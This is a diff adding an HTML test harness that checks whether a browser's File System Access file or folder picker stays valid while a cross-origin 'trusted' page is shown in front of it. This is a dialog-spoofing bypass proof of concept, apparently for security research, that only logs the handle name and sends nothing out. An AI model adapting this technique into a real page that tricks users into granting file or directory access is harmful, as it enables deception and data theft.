@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>FSA dialog-scoping bypass test harness</title>
+  <style>
+    :root { --bg:#111; --fg:#0f0; --accent:#2563eb; }
+    * { box-sizing: border-box; }
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      max-width: 680px;
+      margin: 0 auto;
+      padding: 1rem 1rem calc(1rem + env(safe-area-inset-bottom));
+      line-height: 1.5;
+      -webkit-text-size-adjust: 100%;
+    }
+    h1 { font-size: 1.3rem; }
+    p { font-size: .95rem; }
+    fieldset { margin: 1rem 0; border: 1px solid #ccc; border-radius: 8px; padding: .75rem 1rem; }
+    legend { font-weight: 600; font-size: .9rem; padding: 0 .4rem; }
+    label {
+      display: block;
+      margin: .1rem 0;
+      padding: .55rem .4rem;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+    label:active { background: #eee; }
+    input[type=radio] { transform: scale(1.25); margin-right: .6rem; vertical-align: middle; }
+    .row { margin: 1rem 0; }
+    .row input[type=text], .row input[type=url] {
+      width: 100%;
+      padding: .7rem;
+      font-size: 1rem;
+      border: 1px solid #bbb;
+      border-radius: 8px;
+    }
+    .delays { display: flex; gap: .75rem; flex-wrap: wrap; }
+    .delays > div { flex: 1 1 45%; }
+    .delays label { padding: 0 0 .25rem; font-size: .85rem; font-weight: 600; }
+    .delays input[type=number] {
+      width: 100%;
+      padding: .7rem;
+      font-size: 1rem;
+      border: 1px solid #bbb;
+      border-radius: 8px;
+    }
+    button {
+      display: block;
+      width: 100%;
+      margin: 1rem 0 .5rem;
+      padding: 1rem;
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #fff;
+      background: var(--accent);
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      touch-action: manipulation;
+    }
+    button:active { filter: brightness(.9); }
+    #log {
+      white-space: pre-wrap;
+      word-break: break-word;
+      background: var(--bg);
+      color: var(--fg);
+      padding: 1rem;
+      margin-top: 1rem;
+      border-radius: 8px;
+      min-height: 5rem;
+      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+      font-size: .85rem;
+    }
+    #support { font-size: .8rem; color: #666; margin-top: .5rem; }
+  </style>
+</head>
+<body>
+  <h1>File System Access — dialog-scoping bypass test</h1>
+  <p>
+    Benign test harness. Each run opens a native picker, then surfaces a
+    cross-origin trusted page in front of it, and logs which handle name THIS
+    origin received. Nothing is transmitted. Test on devices/browsers you own.
+  </p>
+  <div id="support"></div>
+
+  <fieldset>
+    <legend>1. Which picker (parity test)</legend>
+    <label><input type="radio" name="picker" value="open" checked> showOpenFilePicker (original)</label>
+    <label><input type="radio" name="picker" value="save"> showSaveFilePicker</label>
+    <label><input type="radio" name="picker" value="dir"> showDirectoryPicker (whole folder)</label>
+    <label><input type="radio" name="picker" value="input"> &lt;input type=file&gt; (works on Safari/iOS &amp; plain http)</label>
+  </fieldset>
+
+  <fieldset>
+    <legend>2. How to surface the trusted page</legend>
+    <label><input type="radio" name="surface" value="popup" checked> window.open (popup, same window)</label>
+    <label><input type="radio" name="surface" value="newtab"> window.open(_blank) (new tab)</label>
+    <label><input type="radio" name="surface" value="location"> top-navigate (same tab)</label>
+    <label><input type="radio" name="surface" value="pip"> Document Picture-in-Picture (if supported)</label>
+  </fieldset>
+
+  <div class="row delays">
+    <div>
+      <label for="pickerDelay">Picker open delay after click (secs — keep 0; long delays drop activation)</label>
+      <input id="pickerDelay" type="number" min="0" step="0.5" value="0">
+    </div>
+    <div>
+      <label for="surfaceDelay">Surface trusted page AFTER picker opens (secs)</label>
+      <input id="surfaceDelay" type="number" min="0" step="0.5" value="3">
+    </div>
+  </div>
+
+  <div class="row">
+    <label for="url">Trusted URL to show:</label>
+    <input id="url" type="url" value="https://example.com" inputmode="url" autocapitalize="off" autocorrect="off">
+  </div>
+
+  <button id="go">Run test</button>
+  <!-- hidden classic file input for the Safari/iOS-compatible path -->
+  <input id="fileInput" type="file" style="position:absolute;left:-9999px" aria-hidden="true">
+  <div id="log">waiting…</div>
+
+  <script>
+    const logEl = document.getElementById('log');
+    const log = (m) => { logEl.textContent += '\n' + m; };
+    const pick = () => document.querySelector('input[name=picker]:checked').value;
+    const surf = () => document.querySelector('input[name=surface]:checked').value;
+    const trusted = () => document.getElementById('url').value;
+    const pickerDelayMs = () => Math.max(0, parseFloat(document.getElementById('pickerDelay').value) || 0) * 1000;
+    const surfaceDelayMs = () => Math.max(0, parseFloat(document.getElementById('surfaceDelay').value) || 0) * 1000;
+    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+    // Feature detection so results are interpretable per-browser.
+    (function () {
+      const has = (k) => (k in window) ? 'yes' : 'no';
+      document.getElementById('support').textContent =
+        'secureContext: ' + window.isSecureContext +
+        ' (FSA pickers require HTTPS/localhost — plain http://IP disables them). ' +
+        'showOpenFilePicker: ' + has('showOpenFilePicker') +
+        ', showSaveFilePicker: ' + has('showSaveFilePicker') +
+        ', showDirectoryPicker: ' + has('showDirectoryPicker') +
+        ', documentPictureInPicture: ' + has('documentPictureInPicture') +
+        '. (Safari/iOS supports none of the FSA pickers — use the <input type=file> option there.)';
+    })();
+
+    function invokePicker() {
+      const p = pick();
+      if (p === 'open') return window.showOpenFilePicker().then(a => a[0]);
+      if (p === 'save') return window.showSaveFilePicker();
+      if (p === 'dir')  return window.showDirectoryPicker();
+      if (p === 'input') {
+        return new Promise((resolve, reject) => {
+          const inp = document.getElementById('fileInput');
+          inp.value = '';
+          inp.onchange = () => inp.files[0]
+            ? resolve({ name: inp.files[0].name })
+            : reject(new Error('no file'));
+          inp.click();
+        });
+      }
+    }
+
+    function surfaceTrusted() {
+      const s = surf(), u = trusted();
+      if (s === 'popup')       window.open(u);
+      else if (s === 'newtab') window.open(u, '_blank');
+      else if (s === 'location') window.location.href = u;
+      else if (s === 'pip') {
+        if (window.documentPictureInPicture) {
+          window.documentPictureInPicture.requestWindow().catch(e => log('PiP failed: ' + e));
+        } else log('Document PiP not supported here.');
+      }
+    }
+
+    document.getElementById('go').addEventListener('click', async () => {
+      const pd = pickerDelayMs(), sd = surfaceDelayMs();
+      logEl.textContent = 'started (' + pick() + ' / ' + surf() +
+        ') pickerDelay=' + (pd/1000) + 's surfaceDelay=' + (sd/1000) + 's';
+      try {
+        if (pd > 0) {
+          log('waiting ' + (pd/1000) + 's before opening picker…');
+          await sleep(pd);   // NB: long delays can drop transient user activation
+        }
+        const promise = invokePicker();          // native dialog opens
+        log('picker invoked; surfacing trusted page in ' + (sd/1000) + 's…');
+        setTimeout(surfaceTrusted, sd);           // bring cross-origin page forward after delay
+        const handle = await promise;             // this origin receives the handle
+        log('THIS origin received handle: ' + (handle && handle.name));
+        log('=> picker stayed valid while a different origin was displayed = scoping issue.');
+      } catch (e) {
+        log('picker rejected/dismissed: ' + (e && e.name) + ' — ' + (e && e.message));
+        log('=> fix held, unsupported, or activation expired for this combination.');
+      }
+    });
+  </script>
+</body>
+</html>
